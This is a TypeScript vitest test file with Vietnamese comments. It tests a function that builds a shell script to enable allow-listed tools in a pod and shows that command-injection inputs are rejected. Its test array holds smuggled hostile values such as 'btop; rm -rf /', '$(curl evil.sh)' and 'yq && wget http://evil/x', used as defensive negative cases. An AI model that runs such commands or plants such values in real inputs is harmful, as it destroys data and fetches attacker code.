import { describe, expect, it } from 'vitest';
import { buildToolsEnableScript } from './tools-enable';

/**
 * C4 — bộ công cụ theo bài. Ba nhóm bất biến, mỗi nhóm hỏng theo một kiểu khác:
 * lãng phí (một lượt exec thừa), sai (bật nhầm / thiếu), và nguy hiểm (tên lạ
 * chảy thẳng vào một dòng lệnh shell chạy trong pod).
 */

describe('buildToolsEnableScript — rỗng thì KHÔNG tốn lượt exec nào', () => {
  it('mảng rỗng ⇒ null, không phải một script rỗng', () => {
    /*
      `null` là tín hiệu call-site đọc để bỏ HẲN vòng `POST /exec/session/{id}`.
      Trả về `'set -eu\n'` thay vì `null` vẫn "chạy đúng", nhưng nó tốn chín
      bước authz + một `kubectl exec` cho đúng không việc gì — và phần lớn bài
      sẽ không khai `toolset`, nên đó là đường đi THƯỜNG XUYÊN NHẤT của hàm này.
    */
    expect(buildToolsEnableScript([])).toBeNull();
  });

  it('toàn tên lạ ⇒ cũng là null, không phải một lệnh dlp-tools không đối số', () => {
    // `dlp-tools enable` không đối số là một lệnh vô nghĩa; nếu nó thoát non-zero
    // thì `set -eu` giết script và người học nhận "Bật bộ công cụ thất bại" cho
    // một bài vốn không yêu cầu công cụ nào.
    expect(buildToolsEnableScript(['khong-co-that', 'emacs'])).toBeNull();
  });
});

describe('buildToolsEnableScript — chỉ tên có trong danh mục mới vào được dòng lệnh', () => {
  it('bật đúng những tool đã khai, MỘT lời gọi cho cả bộ', () => {
    const script = buildToolsEnableScript(['btop', 'yq']) ?? '';
    expect(script).toContain('dlp-tools enable btop yq');
    // Một lời gọi, không phải một lời gọi mỗi tool — mỗi lời gọi thừa là một
    // vòng exec thừa trong pod.
    expect(script.match(/dlp-tools enable/g)).toHaveLength(1);
  });

  it('`set -eu` có mặt: hỏng giữa chừng phải thoát non-zero', () => {
    // Thiếu dòng này, một `dlp-tools` hỏng vẫn để script thoát 0, `runSetup`
    // báo thành công, và bài chết ở step sau với triệu chứng không liên quan.
    expect(buildToolsEnableScript(['yq']) ?? '').toContain('set -eu');
  });

  it('giữ THỨ TỰ người soạn đã lưu', () => {
    // `update` ghi lại đúng mảng này; đảo thứ tự là một thay đổi byte trong DB
    // mà không ai ra lệnh.
    expect(buildToolsEnableScript(['yq', 'btop']) ?? '').toContain('dlp-tools enable yq btop');
  });

  it('bỏ trùng — hai lần `yq` vẫn là một đối số', () => {
    expect(buildToolsEnableScript(['yq', 'yq']) ?? '').toContain('dlp-tools enable yq\n');
  });

  it('tên lạ bị BỎ, tên hợp lệ đi cùng vẫn được bật', () => {
    const script = buildToolsEnableScript(['btop', 'khong-co-that']) ?? '';
    expect(script).toContain('dlp-tools enable btop');
    expect(script).not.toContain('khong-co-that');
  });
});

describe('buildToolsEnableScript — hàng rào tiêm lệnh', () => {
  /*
    Giá trị tới hàm này đọc từ CỘT `text` của DB, và cột đó nhận bất cứ chuỗi
    nào một lượt seed hay một bản vá SQL tay ghi vào. Zod ở `authoring` chỉ gác
    đường GHI qua UI; khoảng cách giữa hai tầng chính là chỗ tiêm lệnh.

    Phép kiểm này gác chính khoảng cách đó, nên nó phải khẳng định chuỗi độc KHÔNG
    xuất hiện trong output — chứ không chỉ khẳng định "có trích dẫn".
  */
  const DOC_HAI = [
    'btop; rm -rf /',
    '$(curl evil.sh)',
    '`id`',
    'yq && wget http://evil/x',
    'yq\nrm -rf /',
    '--version',
  ];

  it.each(DOC_HAI)('từ chối %j', (raw) => {
    const script = buildToolsEnableScript([raw]);
    expect(script).toBeNull();
  });

  it('tên độc đi kèm tên thật thì chỉ tên thật sống sót', () => {
    const script = buildToolsEnableScript(['yq', 'btop; rm -rf /']) ?? '';
    expect(script).toContain('dlp-tools enable yq\n');
    expect(script).not.toContain('rm -rf');
    expect(script).not.toContain(';');
  });
});
